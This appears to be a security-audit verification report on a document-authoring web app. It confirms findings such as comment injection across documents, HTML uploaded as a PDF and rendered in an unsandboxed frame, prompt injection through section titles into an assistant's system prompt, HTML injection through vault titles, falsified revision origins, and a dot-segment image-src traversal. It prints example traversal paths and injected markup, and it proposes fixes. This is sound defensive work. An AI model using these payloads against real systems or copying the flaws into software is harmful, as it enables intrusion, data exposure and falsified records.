  - `authoring.router.ts:1271-1310` (`GET /docs`) lists every document id/title/status in the tenant scoped only by `tenant_id`, with no per-document permission filter — confirming document B's id is trivially discoverable by any tenant member, so the attack is practical, not merely theoretical.
- Client corroboration: `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx:2284,2286` (`addComment` posts to the path section but sends `doc_id: activeDocId` in the body) and `:2367-2368` (`addReply` additionally sends `parent_comment_id: parent.id`). The legitimate UI always keeps these consistent; the vulnerability is that the server trusts the body value instead of deriving it, which any direct API call (curl, modified client) can exploit.
- Confirmed no defensive re-check exists anywhere else on this path: grepped `authoring.router.ts` for any `doc_id ===`/`sectionRow.doc_id` comparison around lines 2254-2320 — none exists.

**Why:** The route's only object-level check — both the router-local `canEditSection`/`checkSectionWritable` gate (`authoring.router.ts:443,452`) and the global `authoringObjectAuthorization` middleware (`authoringObjectAuthorization.ts:126-138`) — resolves scope from `req.params.sectionId` via `resolveAuthoringSectionScope`, which joins the section to its *real* `doc_id` column (`authoring-permissions.ts:154-172`). That correctly proves the caller may act on document A, the section's real owner. But the handler then does:
```
const { body, anchor, doc_id, parent_comment_id, position_data } = req.body;   // authoring.router.ts:2257
...
INSERT INTO authoring_comments (id, section_id, doc_id, ...) VALUES ($1,$2,$3,...)  // :2287-2296, doc_id = req.body.doc_id
...
await createAuditEvent(doc_id, ...)   // :2308-2309, same body value
```
`doc_id` here is never compared to the section's true document (the one just authorized). Since `authoring_comments.doc_id` has no foreign key (migration `20260725…sql:84-97`) and `parent_comment_id`'s FK is unscoped by tenant/section (migration `20260728…sql:58-68`), the database enforces nothing either. Every downstream consumer — the comment rail, the audit rail, and critically the freeze gate's open-comment count and its acknowledgment note that gets written into the frozen record — trusts `authoring_comments.doc_id` as ground truth. The result is exactly as reported: a principal with a genuine grant on document A can plant an open comment thread and a fabricated audit event under document B, can do so even while B is FROZEN (the immutability check, `documentStatusAllowsAction`, explicitly always permits the `comment` action regardless of status — `authoring-permissions.ts:125-127` — so freezing B is no obstacle), can thereby force B's freezer into a false "N unresolved comments" 409/acknowledgment (`authoring.router.ts:3777-3826`), and B's own legitimate holders cannot resolve the injected thread because `PATCH /comments/:id`'s authorization (`resolveCommentScope`) is bound to the comment's real section/document (A), not the value it claims (B). Enumerating B's id costs nothing (`GET /docs`, tenant-scoped only). I found no code path — in the router, the global object-authorization middleware, the DDL, or the freeze/read handlers — that ties the body's `doc_id`/`parent_comment_id` to the authorized section, so this holds as reported.

I could not verify this by exercising a live server/database; this is a read-derived confirmation, consistent with the lens report's own caveat.

**Between `7087f46e2` and `HEAD` (`10ad41a2`):** no change. `git diff --stat 7087f46e2..HEAD` touches 82 files, none of which are `server/routes/authoring.router.ts`, `server/middleware/authoringObjectAuthorization.ts`, `server/services/authoring/authoring-permissions.ts`, the two comment-table migrations, or `DocumentWorkbench.tsx`. `10ad41a2` (the HEAD commit) adds a role gate only to the ten `ProtocolDev`-related routers, an unrelated surface. The in-progress uncommitted edit to `ProtocolDev.tsx` in the working tree is likewise unrelated and was ignored as instructed. The finding at HEAD is identical to the finding at `7087f46e2`.

**If confirmed, the smallest correct fix, and where the report's proposed fix is incomplete:**
- Derive `doc_id` from the already-authorized section row instead of trusting the body: fetch it in the same `sectionOwned` query (`authoring.router.ts:2276-2285` already does `SELECT id FROM authoring_sections WHERE id=$1 AND tenant_id=$2`; add `doc_id` to that select) and use that value for both the INSERT and `createAuditEvent`. Reject the request (400) if the body supplied a different `doc_id`, rather than silently overriding it, so a client bug is surfaced instead of hidden.
- For `parent_comment_id`, look it up by id+tenant_id and require its `section_id` to equal the path section (or at minimum its `doc_id`, once corrected, to match) before accepting it as a parent — the report's proposed fix ("same section and tenant") is correct and is the minimum needed given replies are only ever created against one section in the UI.
- Write the comment INSERT and the audit-trail INSERT in one transaction (the report separately flags this ordering issue as SEC-A-9's pattern for revert; the same discipline applies here so a mid-write failure can't leave an unaudited comment).
- One gap in the report's fix list: it doesn't mention that `authoring_comments.doc_id` should also get an actual foreign-key/CHECK tying it to `authoring_sections.doc_id` (e.g. a trigger or a generated column, mirroring how `doc_revisions`/`authoring_citations` already got a real `(section_id, tenant_id)` FK in the same migration file at lines 190-204) — without a DDL-level constraint, a future code path with the same oversight recreates this exact class of bug. Per this repo's Rule 1 (migrations re-run unconditionally, no DROP), such a constraint would need to be added by amending the creating migration in place per that rule, not appended as a new ALTER, if `doc_id` were ever made NOT NULL/FK'd — but a simple `CHECK`/trigger addition is additive and would not need that treatment.

---

## Verification of SEC-A-3
**Verdict:** CONFIRMED
**Severity, as you would grade it:** high — this is a stored file-type-confusion/injection weakness (HTML masquerading as PDF) that runs in the app's own execution context via an unsandboxed same-origin frame; it does not by itself write or falsify a governed record, so it is not a blocker, but it materially threatens the confidentiality of the session (tokens are in web storage per IAM-06) that later signs/releases governed content — a textbook "injection weakness" on the high rung of the given scale.
**What I checked:** `client/src/concept2cure/v2/editor/ProjectFilesPanel.tsx:41-140,180-310,536-558` (client viewer logic and mount at `DocumentWorkbench.tsx:4659-4673`); `server/routes/vault-ingest.ts:1-260` (multer extension filter, body schema, mimetype passthrough); `server/services/vault/vault-ingest.service.ts:205-300` (call into `assertUploadSafe`); `server/middleware/uploadSafety.ts:1-201` (signature+AV composition); `server/utils/fileSignature.ts` (full file — the text-like heuristic); `server/routes/c2c/project-vault.ts:1552-1651` (download route, headers); `server/bootstrap/register-inline-routes.ts:862-864` (mount, only one ingest door found); `terraform/modules/cloudfront/main.tf:1-260` (actual production routing and the SPA response-headers policy); `server/middleware/enterprise-security.ts:121-230` (the nonce CSP that governs Express-served HTML only). I looked for a second upload door into `vault.documents` (`grep` for `INSERT INTO vault.documents` across `server/`) and found only `vault-ingest.ts` and the platform-generated export path `authoring-file-to-vault.ts:351-352`, which sets `mimeType: rendered.contentType` from server-rendered bytes and `origin: 'platform-generated'` — not client-controlled, so it is not a second instance of this bug.

**Why:** Every step in the report's chain is present, unchanged, at HEAD:

1. **No cross-check between extension and declared MIME type at ingest.** `vault-ingest.ts`'s multer filter checks only the filename extension (`.pdf`, `.docx`, … — no `.html`) at lines 53-55, 72-78. The *declared* MIME type comes straight from the multipart part header and is stored verbatim: `mimeType: (req as any).file?.mimetype || 'application/octet-stream'` (`vault-ingest.ts:248`). Nothing ties the two together.
2. **The signature check validates bytes against the declared MIME, not the extension**, and `text/html` is explicitly a recognized, accepted declared type: `TEXT_LIKE_EXACT = new Set([... 'text/html' ...])` (`fileSignature.ts:40-49`); for any text-like MIME it only requires the bytes be "mostly printable" (`fileSignature.ts:152-155`, `isLikelyText` at 78-95). So a request whose file part is named `report.pdf` (passes the extension filter) but declares `Content-Type: text/html` for that part, carrying real HTML bytes, passes `verifyFileSignature` cleanly — there is no rule anywhere that says "an upload named `.pdf` must declare `application/pdf`."
3. **The stored MIME type is served back verbatim on download**: `res.setHeader('Content-Type', doc.mime_type || 'application/octet-stream')` (`project-vault.ts:1644`). `Content-Disposition: attachment` (`:1645`) is irrelevant here because the client never navigates to the URL — it `fetch`es it and calls `.blob()`.
4. **The client keeps that type.** `ProjectFilesPanel.tsx:204`: `const mime = responseHeader(res, 'Content-Type') ?? blob.type ?? ''`, classified as a PDF by `servesAsPdf` (`:118-120`) — `/pdf/i.test(mime) || /\.pdf$/i.test(title)` — so a `.pdf`-titled row is routed to the viewer regardless of its true MIME. The viewer URL is built at `:293`: `URL.createObjectURL(blob.type ? blob : new Blob([blob], { type: 'application/pdf' }))`. Since `res.blob()` yields a `Blob` whose `.type` is populated from the response's `Content-Type` header, `blob.type` here is `"text/html"` (truthy), so the *original* HTML-typed blob is used, not a forced `application/pdf` one.
5. **The frame that shows it has no sandbox**: `<iframe className="pf-viewer-frame" src={viewer.url} title={...} />` (`ProjectFilesPanel.tsx:554`) — I grepped the file and `DocumentWorkbench.tsx` for `sandbox` and found none, and this is the only `<iframe>` in the editor family.
6. **The mount is exactly as claimed**: `DocumentWorkbench.tsx:4659-4673` renders `<ProjectFilesPanel .../>` in the vault rail with no additional wrapper or gate around the viewer.
7. **CSP does not close this in the topology that is actually codified for production.** I went one step further than the report here: `terraform/modules/cloudfront/main.tf` shows the *default* cache behavior (everything except the explicit `/api/*`, `/collab*`, `/scim/*`, `/mcp*`, OAuth paths listed in `alb_path_patterns`, lines 8-22) is served straight from `target_origin_id = "s3-frontend"` (`:190`), carrying `aws_cloudfront_response_headers_policy.spa` (`:117-145`), whose CSP is `frame-ancestors 'none'; base-uri 'self'; object-src 'none'; form-action 'self'` — no `script-src`, `img-src`, or `frame-src`. The file's own comment concedes this: "A script-src for the static SPA needs a browser check through a real distribution first" (`:116-119`). The nonce nonce nonce-based, `'strict-dynamic'` CSP in `enterprise-security.ts:121-230` only applies to HTML Express itself serves (dev / `server/vite.ts`), which is *not* the path the SPA shell takes in the codified production topology — the SPA's own JS bundle and index.html come from S3/CloudFront, per this Terraform, so the document that calls `URL.createObjectURL` (and therefore the blob: URL's inherited CSP, per the CSP spec's "local scheme" inheritance rule) carries the weak policy with no `script-src`. This makes the finding's premise — that the app's real CSP would not stop inline script in the framed HTML — stronger than the original report states it, on the infrastructure as written, not just plausible.

**What I could not verify without a browser:** whether the deployed CloudFront distribution actually matches this Terraform (i.e., that IaC = reality), and the precise cross-browser behavior of CSP inheritance and origin assignment for a `blob:` URL navigated inside an unsandboxed `<iframe>` (Chromium and Firefox both document inheriting the creating document's CSP for blob/about:blank/srcdoc documents, but I did not execute this). I also did not verify live `NODE_ENV` in production actually triggers `assertUploadSafe`'s fail-closed AV branch (irrelevant to this specific finding, since the AV scan does not inspect content-type consistency at all — a clean-scanning HTML file sails through either way). No request was replayed against a running server or database.

**Between `7087f46e2` and HEAD (`10ad41a2`):** nothing changes this finding. `git diff --stat 7087f46e2..HEAD` touches only `server/middleware/orgMembership.ts` and the ten `server/routes/protocol-*.ts` routers (a role-gate fix for ProtocolDev, unrelated to vault ingest/download or the editor viewer), plus docs/work-order files. None of `ProjectFilesPanel.tsx`, `DocumentWorkbench.tsx`, `vault-ingest.ts`, `vault-ingest.service.ts`, `fileSignature.ts`, `uploadSafety.ts`, `project-vault.ts`, or the CloudFront Terraform module are touched. The uncommitted working-tree edit to `ProtocolDev.tsx` (per instructions, ignored) is likewise unrelated. The code I read for this verdict is identical at both commits.

**If confirmed, the smallest correct fix, and where the report's proposed fix is incomplete:**
- The report's fix is directionally right but incomplete on one point: "frame only bytes that begin with `%PDF`, and always wrap them as `new Blob([bytes], {type:'application/pdf'})`" is correct and is the minimal client-side fix — it removes the MIME/extension trust entirely by checking the magic bytes of the actual fetched buffer, not the server-declared or title-declared type. It should operate on the raw `ArrayBuffer`/bytes (e.g., `await res.arrayBuffer()`, check the first 4 bytes for `%PDF`), not on `blob.type`, since `blob.type` is exactly the untrusted value in play.
- Adding `sandbox="allow-same-origin"`-*without* `allow-scripts` (or, better, no `sandbox` value granting script execution at all, since a PDF viewer never needs it) closes the residual risk even if the byte check is ever bypassed or a future code path skips it — this is the right defense-in-depth the report calls for, and I'd make it non-optional independent of the byte-sniffing fix (belt and suspenders, since two independent controls failing together is what got here).
- Server-side, the report's fix ("tie the declared type to the file's magic bytes and extension, and refuse `text/html` and XML for `.pdf`") is correct but should be stated more generally: `verifyFileSignature` should also be called with the type *inferred from the extension*, not only the client-declared MIME, and the two should be required to agree (e.g., a `.pdf` extension must declare and verify as `application/pdf`, not merely "some text-like type that happens to pass the printable heuristic"). As it stands, `fileSignature.ts`'s text-like branch (`:39-49`) treats `text/html` as an intentionally-supported case for text uploads generally (`.txt`, `.csv`, `.md` are legitimately text/plain-family), so the fix needs to bind MIME-vs-extension consistency, not simply blacklist `text/html`/XML — otherwise a similarly-crafted `.txt`-declared-as-`text/html` file (if `.txt` is ever treated as HTML-renderable somewhere else) would reopen the same class of bug. I would also add a rule at ingest that a file whose extension is `.pdf` must present the `%PDF` magic bytes regardless of what MIME type was declared, independent of the text-like heuristic path.
- Not addressed by the report or in this finding's scope, but adjacent: the CloudFront SPA policy's total absence of `script-src`/`frame-src`/`img-src` (baselined as INF-04, cited by the report) is what removes network-level backstop for this class of bug in the deployed topology I found in Terraform; closing SEC-A-3's client and ingest paths is the correct primary fix, but INF-04's residual (no `script-src` on the S3-origin behavior) is precisely why this bug is dangerous rather than merely sloppy, and is worth re-raising together with SEC-A-3 rather than treated as fully separate.

This is a **new** finding (SEC-A-3), not a regression of any baseline id — the earlier five security-audit passes never examined `ProjectFilesPanel.tsx` or `DocumentWorkbench.tsx` (per the source report's own "Earlier findings re-verified" table, which I did not need to re-litigate since this verification task is scoped to SEC-A-3 alone).

---

Note on HEAD: repository HEAD is `10ad41a2` (P11-C-1, ProtocolDev role gate). `git diff 7087f46e2..HEAD --stat` touches only `server/middleware/orgMembership.ts`, the ten `server/routes/protocol-*.ts` routers, and their tests/docs — none of the files these six findings depend on (`authoring.router.ts`, `DocumentWorkbench.tsx`, `chat-context-builder.ts`, `stream.ts`, `RichSectionEditor.tsx`, `ProjectFilesPanel.tsx`, `revision-ledger.ts`, `source-usage.service.ts`, `authService.tsx`) were touched. The working-tree edit to `ProtocolDev.tsx` is likewise unrelated. So the verdicts below hold at HEAD exactly as at `7087f46e2`.

## Verification of SEC-A-4
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium — matches the report's grade. It is a live prompt-injection channel into a system prompt, but the register's write-class tools require a human confirmation click (`AnaToolExecutor.ts:338-360`, `preHandlerRefusal`), which bounds the immediate blast radius to read-class tool calls and misleading narration rather than unattended writes.
**What I checked:** `chat-context-builder.ts:143-152`, `stream.ts:461,781,836-838`, `stream.ts:468-487` (the injection guard), `DocumentWorkbench.tsx:963-984`, `authoring.router.ts:1815-1819`, `surface-context-block.ts:1-45` (the sibling builder that does sanitize).
**Why:** `buildAuthoringContextBlock` interpolates `ac.sectionTitle` with no escaping, cap or fence: `` parts.push(`  <section_title>${ac.sectionTitle}</section_title>`) `` (`chat-context-builder.ts:150`). `stream.ts:781` builds the block and `:836-838` appends it raw to `orchestration.systemPrompt`. The only injection inspection in this route is `guardUserInput(message, …)` at `stream.ts:479` — it never sees `authoring_context`. The client sends `sectionTitle: activeSection?.title` (`DocumentWorkbench.tsx:973`), and any author with edit rights sets that title verbatim server-side with no sanitization: `if (title !== undefined) { updates.push('title = $…'); values.push(title); }` (`authoring.router.ts:1815-1819`). The module beside it, `surface-context-block.ts`, states this exact class of payload is untrusted and fences/sanitizes it (`:18-30`) — the authoring builder does neither, which is the asymmetry the finding turns on.
**If confirmed, the smallest correct fix:** apply the same `sanitizeLine`/cap/fence treatment `buildSurfaceContextBlock` uses to every field in `buildAuthoringContextBlock`, and route the assembled authoring block (not just `message`) through `guardUserInput`. The report's fix is correct and sufficient; add running the block through the injection guard as well.

## Verification of SEC-A-5
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium — matches the report. Real cross-user leak and mis-attribution risk, but it requires a shared/unlocked browser profile (narrow trigger), and the person must actively click "Restore" and then "Save" for it to enter the record.
**What I checked:** `DocumentWorkbench.tsx:3836`; `RichSectionEditor.tsx:325` (`cacheKeyFor`), `:1086-1087` (`cacheDraft`), `:1097-1099` (auto-offer on mount), `:1106-1120` (`restoreCached`), `:1873-1882` (the restore-offer UI) vs `:1886` (the ribbon, which does gate on `!readOnly`); `authService.tsx:986-995` (`clearAuth`) and `:994` (`SecureStorage.clear()`).
**Why:** the cache key is `'dc::' + storageKey` where `storageKey={activeSection.id}` (`DocumentWorkbench.tsx:3836`) — no tenant or user in the key, so it is keyed purely by section id, device-wide. `cacheDraft` writes every change to `localStorage` (`RichSectionEditor.tsx:1087`). On mount, any cached value that differs from the saved one is silently offered back with no author/time label (`:1097-1099`, and the UI at `:1873-1876` says only "A draft cached on this device differs from the saved section"). `logout`'s `clearAuth()` calls `SecureStorage.clear()` (`authService.tsx:994`), which only iterates `AUTH_STORAGE_KEYS` and `LEGACY_BEARER_KEYS` — I read the full `SecureStorage.clear()` body and confirmed it never touches a `dc::` key. I additionally confirmed the restore-offer block itself (`:1873`) carries no `!readOnly` guard, unlike the ribbon two lines later (`:1886`) — and `restoreCached` (`:1106-1120`) contains no read-only check either, so on a sealed/frozen section the stale draft can still be forced into the canvas. This is slightly worse than the report states (it doesn't just outlive sign-out; it can also override a sealed section's displayed text), but confirms the same underlying claim.
**If confirmed, the smallest correct fix:** key the cache by tenant+user+section, purge `dc::*` in `clearAuth`, label the offer with whose draft and when, and gate the offer/restore on `!readOnly`. All four are needed; the report's three-part fix should add the fourth (suppress-on-read-only), which I found already missing from `restoreCached` itself, not just the offer banner.

## Verification of SEC-A-6
**Verdict:** CONFIRMED
**Severity, as you would grade it:** high, one grade above the report's medium. This is squarely an "injection weakness" that materially misrepresents governed content: `insertReference` promises text but a crafted vault title can plant a forged-author suggestion or a forged citation into a governed section, both taken as fact downstream (feeding straight into SEC-A-7's unverified-lineage gap). No script executes (TipTap's schema whitelist blocks arbitrary tags), so it stops short of blocker, but it is more than a narrow-trigger medium — any tenant member who can upload a vault file (routine access) can craft this, and any colleague performing a routine "insert reference" action triggers it.
**What I checked:** `ProjectFilesPanel.tsx:96-102` (`referenceTextFor`), `:345-348` (the toast claiming "as text"); `RichSectionEditor.tsx:171` ("Deliberately text"), `:1432-1438` (`insertReference` → `insertContent(clean)`); `DocumentWorkbench.tsx:4668` (wiring); `server/routes/vault-ingest.ts:117` (`documentTitle: z.string().min(1, …)`, no HTML restriction); `node_modules/@tiptap/core/dist/index.js:555-560,603-630,680-696` (`insertContent` on a string routes through `createNodeFromContent` → `elementFromString` → `DOMParser().parseFromString(..., "text/html")`).
**Why:** `referenceTextFor` interpolates the raw title into a bracketed string with no escaping (`ProjectFilesPanel.tsx:96-101`); `insertReference` then calls `editor.chain().focus().insertContent(clean).run()` (`RichSectionEditor.tsx:1437`), and I confirmed in `@tiptap/core`'s bundled source that a string argument to `insertContent` is parsed as HTML via `DOMParser`, not inserted as a literal text node. `vault-ingest.ts:117` places no constraint on `documentTitle` beyond non-empty, so a title containing `<ins data-author-id="…" data-author-name="…">…</ins>` or `<a data-cite="…">` will be parsed into the editor's real suggestion/citation nodes. The UI tells the user plain text was inserted (`ProjectFilesPanel.tsx:347`) when it was not.
**If confirmed, the smallest correct fix:** the report's fix is right and sufficient — `insertContent({ type: 'text', text: clean })`, or HTML-escape `clean` before calling `insertContent`. I'd add: reject/encode this at `referenceTextFor` construction time too, so no other future caller of that helper re-introduces the same string-as-HTML path.

## Verification of SEC-A-7
**Verdict:** CONFIRMED
**Severity, as you would grade it:** high, one grade above the report's medium. The scale's "high" bucket is "the person can be materially misled about governed content or its state" — that is exactly what a falsified `origin` (`human-edit` vs `ai-draft-accept`) or a falsified contributor list does once it is folded into `doc_revisions`' tamper-evident hash chain (`revision-ledger.ts:1-38`), because `chain_sha256 = H(prev ∥ content_sha256 ∥ created_by ∥ origin)` then vouches for the false claim forever. I did not find a live write path to a signed/released state from this alone, so I stop short of blocker.
**What I checked:** `DocumentWorkbench.tsx:2003-2009,2025-2026,3850-3858,4093-4096`; `authoring.router.ts:1655` (`machineContributors`), `:1873-1879` (`createRevision(...,'ai-draft-accept'|'human-edit',...)`), `:5891-5906` (`describeProposer`), `:5987-6006` (tracked-change-decision audit write); `revision-ledger.ts:180-200` (`machineContributors`), `:1-38` (chain design); `DocumentWorkbench.tsx:262-267` (rail rendering).
**Why:** `machineContributors` (`revision-ledger.ts:188-200`) validates only that a client-sent `id` is in a closed `MACHINE_AUTHOR_IDS` vocabulary and substitutes the canonical name — it verifies *which* machine identity is being claimed, never *whether the claim is true* (i.e., that the accompanying text actually came from a real AnA turn). The regular section-save route (`authoring.router.ts:1655-1661,1873-1879`) accepts `acceptedAuthors`/`acceptedMachineText` from the request body and sets the revision's permanent `origin` from them with no tie to a server-issued draft/turn id — contrast the separate from-draft accept path, which *does* validate against a server-held `draftId` via `consumeDraftCandidate` (`authoring.router.ts:3181-3229`). So a human typing text directly can call the PATCH endpoint with a matching `acceptedMachineText` entry and have it permanently chained as `ai-draft-accept`, or omit the fields to have real AI-drafted text chained as an ordinary `human-edit` — the ledger cannot tell the difference and the chain hash bakes the false claim in. Separately, the tracked-change-decision route (`:5987-6006`) stores client-sent `text`, `changeType` and `sectionId` with no check that `sectionId` belongs to the URL's `:id`. One mitigating fact I verified that softens (but does not close) this: that route's *proposer* field is explicitly qualified — `describeProposer` (`:5891-5906`) canonicalizes only recognized machine ids and otherwise records caller-asserted text flagged as unverified, and the rail renders it as "(proposed by X, as recorded by the editing client)" (`DocumentWorkbench.tsx:262-267`). No equivalent disclaimer exists for the revision ledger's `origin`/`contributors`, which is the part of this finding that actually enters the hash-chained Part 11 record.
**If confirmed, the smallest correct fix:** the report's fix is correct — tie `acceptedMachineText` acceptance to a server-issued id (an AnA turn/draft id), the way the from-draft path already does, and verify `sectionId` in tracked-change decisions against `:id`. I'd add: until that lands, the `origin` field itself should carry the same "as recorded by the editing client" qualifier the tracked-change route already uses for `proposedBy`, since it is currently the more consequential unqualified claim.

## Verification of SEC-A-8
**Verdict:** CONFIRMED
**Severity, as you would grade it:** high, one grade above the report's medium, for the audit-omission half specifically. `cite-source`, the uncite `DELETE`, and `refresh-all` never write an audit row — I read the full handlers and the services beneath them and found no `createAuditEvent`/`createAuditTrail` call anywhere on any of the three paths. That is not a narrow-trigger defect (the "medium" bucket) — it happens on every single call, unconditionally, and the rail presents `authoring_audit_trail` as "the list of governed acts" (`DocumentWorkbench.tsx:4370`) while an entire class of evidence-lineage changes never appears in it, which is a governed state shown as more complete than it is. The re-cite checksum reset is a narrower, race-window trigger and would be medium on its own.
**What I checked:** `authoring.router.ts:2515-2546` (`cite-source`), `:2549-2571` (`DELETE cite-source`), `:4631-4667` (`refresh-all`); `source-usage.service.ts:186-241` (`citeSource`), `:243-260` (`removeSourceCitation`); `DocumentWorkbench.tsx:1635-1648` (`loadSources`), `:3901-3917` (implicit `onCite`).
**Why:** `citeSource` re-resolves an already-cited source with `UPDATE authoring_citations SET payload_sha256 = $1, citation_text = …` (`source-usage.service.ts:213-219`) with no audit write anywhere in the function; `removeSourceCitation` is a bare `DELETE` (`:246-253`) with none either; the router handlers wrapping both (`authoring.router.ts:2515-2546`, `:2549-2571`) add none on top. `refresh-all` (`:4631-4667`) likewise calls `refreshSourceCitation` per row with no audit write in the loop. On the checksum-reset trigger: `loadSources` does `setSources([])` on every section switch before its GET resolves (`DocumentWorkbench.tsx:1637`), and the implicit `onCite` handler only skips re-citing when the source is found in that (possibly still-empty) `sources` array (`:3910-3916`) — so a citation inserted in that window re-triggers `citeSource` on an already-cited source and silently resets its stored checksum, exactly as reported.
**If confirmed, the smallest correct fix:** the report's fix is right — write an audit row in the same transaction for every citation write (cite, uncite, refresh, refresh-all), make re-cite of an already-linked source a no-op, and gate the implicit `onCite` on `sourcesState === 'ready'` rather than on the momentarily-empty local array.

## Verification of SEC-A-9
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium — matches the report. This is a genuine ordering defect, but it only produces an orphaned/false state when the standalone audit write itself fails after the transaction has already committed, which is a narrow trigger (an audit-log outage), not something that happens on every revert.
**What I checked:** `authoring.router.ts:2158-2212` (the revert transaction), `:2207` (`COMMIT`), `:2212` (`client.release()`), `:2215-2224` (`createAuditTrail` called after, with no client argument → defaults to `executor: Queryable = pool`, `:659-693`); `authoring-evidence.ts:230-249`/`authoring.router.ts:672-684` (standalone-executor policy: throws in production, best-effort otherwise); `DocumentWorkbench.tsx:2234-2260` (client revert handler: on `!res.ok` it shows "Couldn't revert…" and does not apply the (already-committed) new content).
**Why:** the revert route commits content, lineage, the revision row, and the filing copy inside one transaction, then calls `client.release()` (`:2212`), and only after that calls `createAuditTrail(req, …, 'REVERT', …)` with the default `executor = pool` (`:2215-2224`, `:659`) — i.e., a second, independent connection outside the committed transaction. I confirmed the fail policy: `if (executor !== ctx.pool) throw error; if (process.env.NODE_ENV === 'production') throw …` (`authoring-evidence.ts:238-247`) — meaning a standalone caller (which this is) only throws in production when the audit write itself fails. If it does, the route's outer catch returns a 500 (`serverError`, confirmed by reading the enclosing try/catch), and the client shows "Couldn't revert — the server refused it" while, per the code I read, the content/revision/filing changes from the already-executed `COMMIT` stand. I confirmed by contrast that the ordinary section-save path writes its `createAuditTrail` call inside the same transaction, before `COMMIT` (`authoring.router.ts:1927`, `COMMIT` at `:1989`) — revert is the one write path that doesn't follow that pattern.
**If confirmed, the smallest correct fix:** the report's fix is correct and sufficient — pass the transaction's `client` as the `executor` argument to `createAuditTrail` and call it before `COMMIT`, matching the save path's own pattern at `authoring.router.ts:1927`.

---

## Verification of SEC-B-1
**Verdict:** CONFIRMED
**Severity, as you would grade it:** high — a stored injection lets a document's content choose an authenticated same-origin GET that fires in the *viewer's* identity with no click, materially misleading the audit trail about who performed an action; it does not itself sign/release/approve a primary regulated record, which is what keeps it below blocker.

**What I checked:** `client/src/concept2cure/v2/editor/imageNode.ts:1-207` (full), `client/src/concept2cure/v2/editor/AuthoredHtml.tsx` (full), `client/src/concept2cure/components/ana/renderSafeMarkdown.ts:100-199`, `client/src/lib/queryClient.ts:362-459`, `client/src/concept2cure/v2/editor/RichSectionEditor.tsx:750-765,854-1120`, `client/src/concept2cure/v2/__tests__/imageEditing.test.ts` (full), `server/routes/authoring.router.ts:1647-1830`, `server/services/authoring/authoring-html-sanitizer.ts` (full), `server/routes/tenant-export.ts:1-231`, `server/routes/global-compliance.ts:400-528`, `server/bootstrap/register-advanced-platform-routes.ts:24,176`, `server/middleware/enterprise-security.ts:184-251`, `terraform/` (grepped for WAF, none). Ran `git diff --stat 7087f46e2 HEAD` and per-file `git log` to confirm nothing in this path changed since the audited commit. Independently reproduced the URL-collapsing claim with Node's WHATWG `URL` (the same algorithm browsers' `fetch`/`URL` use), rather than trusting the report's own stubbed-fetch harness.

**Why:** the reasoning, with quoted lines.

The check is a literal, unnormalized prefix test:
```
// imageNode.ts:51-53
export function isApiImageSrc(src: string): boolean {
  return src.startsWith(AUTHORING_IMAGE_URL_PREFIX);   // '/api/authoring/images/'
}
```
It is fed straight into `fetch` with the viewer's own credentials:
```
// imageNode.ts:71                res = await apiRequest('GET', src);
// queryClient.ts:373-374  'x-organization-id': organizationId, Authorization: `Bearer ${authToken}`,
// queryClient.ts:381      credentials: 'include',
// queryClient.ts:388      const response = await fetch(url, options);
```
`url` is the raw, unmodified `src` string. I confirmed independently (not from the report's own harness) that the WHATWG URL algorithm both `fetch` and `new URL()` implement collapses dot segments — including percent-encoded ones, which the spec explicitly treats as single/double-dot segments — before the request line is ever sent:
```
$ node -e 'console.log(new URL("/api/authoring/images/../../tenant-export/full","http://localhost").pathname)'
/api/tenant-export/full
$ node -e 'console.log(new URL("/api/authoring/images/../../compliance/gdpr/7/data-subject/42/export","http://localhost").pathname)'
/api/compliance/gdpr/7/data-subject/42/export
```
So the literal string that passes `isApiImageSrc` (it still starts with `/api/authoring/images/`) is *not* the path the network actually receives — the browser normalizes before transmission, meaning any server-side traversal filter would see a perfectly clean path with no dots at all. This is the gap the "second door" question in my brief flags, and it's real: the check and the request operate on two different strings.

The node view fires this fetch on render, with no user click (`addNodeView`, imageNode.ts:155-206), and the same flawed `resolveImageSrc` is reused by the read-only renderer:
```
// AuthoredHtml.tsx:39         import { NOT_A_FIGURE_REF, resolveImageSrc } from './imageNode';
// AuthoredHtml.tsx:70                    const url = await resolveImageSrc(refSrc);
```
Storage is unfiltered — the PATCH route writes `content` verbatim:
```
// authoring.router.ts:1801-1802
updates.push(`content = $${paramCount}`);
values.push(content);
```
with `content` destructured straight from `req.body` a few lines above and no sanitizer call in between. The server-side sanitizer used on the AI-draft path is explicit that it does *not* touch `src`:
```
// authoring-html-sanitizer.ts:28-30
// `<script>`, inline event handlers, `javascript:` URLs and every unknown tag
// or attribute are removed. Same-app `/api/` image references are left as the
// editor stores them
```
And the schema itself parses any `img[src]` unchecked (`imageNode.ts:136-138`), so whatever HTML reaches a section (direct PATCH, paste of clipboard HTML at `RichSectionEditor.tsx:885-888`, a vault title via "Insert reference," or a confirmed AnA draft through `sanitizeAuthoringSectionHtml`) can carry the payload straight into the schema.

I confirmed the two cited GET routes really write, at HEAD:
```
// tenant-export.ts:162   if (!isAdmin(req)) { return res.status(403)... }
// tenant-export.ts:170   const receipt = await recordExportReceipt(pool, {...
// tenant-export.ts:197   const auditTrail = await recordAuditRow({ ... action: 'tenant.export.full', ...
// global-compliance.ts:516-521
await pool.query(`INSERT INTO gdpr_data_subject_requests
  (organization_id, data_subject_id, request_type, status, response_deadline, completed_at, response_details)
 VALUES ($1, $2, 'access_export', 'completed', NOW(), NOW(), $3)`, ...);
```
Both writes happen server-side during request handling, before the response body is ever inspected client-side — so even though the resulting bytes (JSON, not an image) fail to render and the node view shows "could not be displayed," the write has already committed. `res.ok` is true for a 200, so `resolveImageSrc`'s `if (!res.ok) throw` doesn't even trigger for a successful admin/self-subject case.

I checked for mitigations the report might have missed and found none:
- CSP `connectSrc` is `["'self'", 'https://api.openai.com', 'https://*.neon.tech', 'wss:']` (`enterprise-security.ts:251`) — the forged request is same-origin (`'self'`), so CSP does not block it.
- No WAF/path-traversal rule exists anywhere in `terraform/` (grepped for `aws_wafv2`, `PathTraversal`, `path_traversal` — zero hits), and even if one existed, it would inspect the *normalized* request line the browser already sent, which by then contains no dots to detect.
- Because auth here is a bearer token read from the app's own JS state (`getCachedAuthToken()`), not a cookie, this is not blocked by the usual CSRF defenses (SameSite cookies) either — those don't apply, and don't need to, since the forgery is same-origin and first-party, which is actually a stronger primitive than cross-site CSRF, not a weaker one.
- The only existing test (`imageEditing.test.ts:59-63`) checks a valid ref, an `https:` URL and a `data:` URI — no traversal case, confirmed by reading the file in full.

